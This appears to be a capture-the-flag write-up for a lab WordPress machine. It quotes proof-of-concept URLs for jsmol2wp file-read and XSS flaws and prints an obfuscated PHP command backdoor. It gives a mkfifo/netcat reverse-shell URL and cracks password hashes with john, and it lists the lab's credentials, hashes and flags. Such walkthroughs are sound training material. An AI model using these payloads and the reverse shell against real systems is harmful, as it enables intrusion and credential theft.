# ENUMERATION
---



## OPEN PORTS
---


| PORT | SERVICE |
| :--- | :------ |
| 22 | ssh |
| 80 | http |

Let's visit the website, we need to add `www.smol.thm` to `/etc/hosts`:



# RECONNAISSANCE
---


![Pasted image 20250127152542.png](../../IMAGES/Pasted%20image%2020250127152542.png)

After going to the website, this the first thing we encounter, if we keep digging, we find the following:

![Pasted image 20250127152619.png](../../IMAGES/Pasted%20image%2020250127152619.png)

![Pasted image 20250127152626.png](../../IMAGES/Pasted%20image%2020250127152626.png)

So, we can use `wpscan` to try to enumerate this website:

```
wpscan --url http://www.smol.thm
```

Most interesting thing we can find in the scan is the following:


![Pasted image 20250127155936.png](../../IMAGES/Pasted%20image%2020250127155936.png)

If we search for an exploit related to this plugin, we find `CVE-2018-20462`, let's take a look:


```
ChatGPT translation of the page that doesn't render in archive.org:
 https://web.archive.org/web/20190915000000*/https://www.cbiu.cc/2018/12/WordPress%E6%8F%92%E4%BB%B6jsmol2wp%E6%BC%8F%E6%B4%9E/

Version: 1.07
Link: https://wordpress.org/plugins/jsmol2wp/
A simple arbitrary file read and XSS vulnerability

Arbitrary file read & SSRF(CVE-2018-20463)
/wp-content/plugins/jsmol2wp/php/jsmol.php 137th line

The parameter $query of file_get_contents is directly controllable, so php://filter is used to read it. Of course, you can also use file:///etc/passwd to read the absolute path.

POC:

http://localhost/wp-content/plugins/jsmol2wp/php/jsmol.php
?isform=true
&call=getRawDataFromDatabase
&query=php://filter/resource=../../../../wp-config.php

As you can see, this is also a simple SSRF.

Reflected XSS (CVE-2018-20462)
/wp-content/plugins/jsmol2wp/php/jsmol.php 157th line

Interestingly, the payload here can be encoded in BASE64, so it can bypass browser filtering.

POC:

http://localhost/wp-content/plugins/jsmol2wp/php/jsmol.php
?isform=true
&call=saveFile
&data=<script>alert(/xss/)</script>
&mimetype=text/html; charset=utf-8

Using Base64:

http://localhost/wp-content/plugins/jsmol2wp/php/jsmol.php
?isform=true
&call=saveFile
&data=PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=
&mimetype=text/html; charset=utf-8
&encoding=base64

The report describes two vulnerabilities in a WordPress plugin called "jsmol2wp". The first vulnerability is an arbitrary file read and server-side request forgery (SSRF) vulnerability (CVE-2018-20463) which can be exploited by controlling the $query parameter of file_get_contents in the jsmol.php file. The second vulnerability is a reflected cross-site scripting (XSS) vulnerability (CVE-2018-20462) which can be exploited by encoding the payload in BASE64. The report provides proof-of-concept (POC) examples for each vulnerability.
```



This talks about an arbitrary file read, let's follow the PoC and visit 

`http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php`

![Pasted image 20250127160431.png](../../IMAGES/Pasted%20image%2020250127160431.png)

It indeed works, we got some credentials: `wpuser`:`kbLSF2Vop#lw3rjDZ629*Z%G`, we can test those credentials at: `http://www.smol.thm/wp-login.php`:

![Pasted image 20250127160614.png](../../IMAGES/Pasted%20image%2020250127160614.png)




# EXPLOITATION
---


![Pasted image 20250127160833.png](../../IMAGES/Pasted%20image%2020250127160833.png)

We got access to the WordPress panel, let's look around for anything that could get as a shell:

![Pasted image 20250127160915.png](../../IMAGES/Pasted%20image%2020250127160915.png)

If we go to `pages`, we can see something called `Webmaster Tasks`, if we check the file, we can find the following:

![Pasted image 20250127160952.png](../../IMAGES/Pasted%20image%2020250127160952.png)

Most important thing would be the first thing on the list, which talks about a backdoor on the `Hello Dolly` plugin, using the same PoC from earlier, we can make a request to: 

```
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-content/plugins/hello.php
```

And view the contents of the plugin:

![Pasted image 20250127161117.png](../../IMAGES/Pasted%20image%2020250127161117.png)

We can see the following line on the code, let's decode the base64:

![Pasted image 20250127161206.png](../../IMAGES/Pasted%20image%2020250127161206.png)

We got `if (isset($_GET["\143\155\x64"])) { system($_GET["\143\x6d\144"]); } `, we can decode the variable names using:

`php -r 'echo "\143\155\x64" . ":" . "\143\x6d\144";'`


![Pasted image 20250127161313.png](../../IMAGES/Pasted%20image%2020250127161313.png)

We got `cmd`, let's breakdown the functionality of the backdoor:

```ad-summary
1. It decodes the `base64` string, which brings up the code we found.
2. It executes the code using the `eval()` function.
3. The decoded code runs what's been passed using `cmd` `GET` parameter using `system` function.
```


We can go to the dashboard and we can check that the plugin is running there:

![Pasted image 20250127161615.png](../../IMAGES/Pasted%20image%2020250127161615.png)

So, we could send a decoded reverse shell in the following way, we would need to visit this URL:

`http://www.smol.thm/wp-admin/?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%20IP%20PORT%20%3E%2Ftmp%2Ff`

![Pasted image 20250127161756.png](../../IMAGES/Pasted%20image%2020250127161756.png)

As we can see, we got a shell, let's make it [stable](../../Commands/Shell%20Tricks/STABLE%20SHELL.md)
![Pasted image 20250127161921.png](../../IMAGES/Pasted%20image%2020250127161921.png)

Nice, now we can begin with privilege escalation.


# PRIVILEGE ESCALATION
---

We already got ourselves a shell, let's list up users:

![Pasted image 20250127161957.png](../../IMAGES/Pasted%20image%2020250127161957.png)

We got four users, since we already got credentials for the SQL database, let's check if there's credentials for some other user:


`mysql -u wpuser -p'kbLSF2Vop#lw3rjDZ629*Z%G' -D wordpress`:

![Pasted image 20250127162224.png](../../IMAGES/Pasted%20image%2020250127162224.png)

Most important one would be `wp_users`, let's list its contents:

![Pasted image 20250127162347.png](../../IMAGES/Pasted%20image%2020250127162347.png)

We can filter it our by using: `select user_login,user_pass from wp_users;`:

![Pasted image 20250127162418.png](../../IMAGES/Pasted%20image%2020250127162418.png)

We got the hashes and the usernames, we can crack them using john:

```
admin:$P$BH.CF15fzRj4li7nR19CHzZhPmhKdX.
think:$P$BOb8/koi4nrmSPW85f5KzM5M/k2n0d/
gege:$P$B1UHruCd/9bGD.TtVZULlxFrTsb3PX1
diego:$P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1
xavi:$P$BB4zz2JEnM2H3WE2RHs3q18.1pvcql1
```

`john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt`:

![Pasted image 20250127163116.png](../../IMAGES/Pasted%20image%2020250127163116.png)

After a while, we get the password for user `diego`, let's switch users:

![Pasted image 20250127163150.png](../../IMAGES/Pasted%20image%2020250127163150.png)

Nice, let's check our privileges and group memberships:

![Pasted image 20250127163238.png](../../IMAGES/Pasted%20image%2020250127163238.png)

We got no sudo permissions, however, we are part of `internal`, which means we are able to read other user's home directories, let's read them all:

![Pasted image 20250127163341.png](../../IMAGES/Pasted%20image%2020250127163341.png)

If we read `think`'s home, we can discover `.ssh`, let's check if there's any `id_rsa`:

![Pasted image 20250127163419.png](../../IMAGES/Pasted%20image%2020250127163419.png)

Lucky, let's copy the contents and login using ssh:


![Pasted image 20250127163545.png](../../IMAGES/Pasted%20image%2020250127163545.png)

We can now check the PAM configuration for `su`:

![Pasted image 20250127163711.png](../../IMAGES/Pasted%20image%2020250127163711.png)

This means that if we use `su` on user `gege` while we are user `think`, we'll be able to switch users successfully without a password needed:

![Pasted image 20250127163759.png](../../IMAGES/Pasted%20image%2020250127163759.png)

Let's check our home directory:

![Pasted image 20250127163843.png](../../IMAGES/Pasted%20image%2020250127163843.png)

We got a file `wordpress.old.zip`, let's send it to our machine:


![Pasted image 20250127164218.png](../../IMAGES/Pasted%20image%2020250127164218.png)

If we try unzipping the file, we need a password, let's use john to attempt to crack it:

```ad-hint
1. `zip2john wordpress.old.zip > zip_hash`

2. `john zip_hash --wordlist=/usr/share/wordlists/rockyou.txt`
```

We get the following:

![Pasted image 20250127164351.png](../../IMAGES/Pasted%20image%2020250127164351.png)

Password is: `hero_gege@hotmail.com`, let's unzip the file:


![Pasted image 20250127164502.png](../../IMAGES/Pasted%20image%2020250127164502.png)

We got a `wp-config.php` file:

![Pasted image 20250127164524.png](../../IMAGES/Pasted%20image%2020250127164524.png)

We got the credentials for `xavi`:`P@ssw0rdxavi@`

![Pasted image 20250127164554.png](../../IMAGES/Pasted%20image%2020250127164554.png)

Let's check our privileges:

![Pasted image 20250127164617.png](../../IMAGES/Pasted%20image%2020250127164617.png)

We can run any command, let's simply switch to root and get both flags:

![Pasted image 20250127164658.png](../../IMAGES/Pasted%20image%2020250127164658.png)

![Pasted image 20250127164744.png](../../IMAGES/Pasted%20image%2020250127164744.png)

```ad-important
User: `45edaec653ff9ee06236b7ce72b86963`
Root: `bf89ea3ea01992353aef1f576214d4e4`
```

Just like that, machine is done!

![Pasted image 20250127164841.png](../../IMAGES/Pasted%20image%2020250127164841.png)

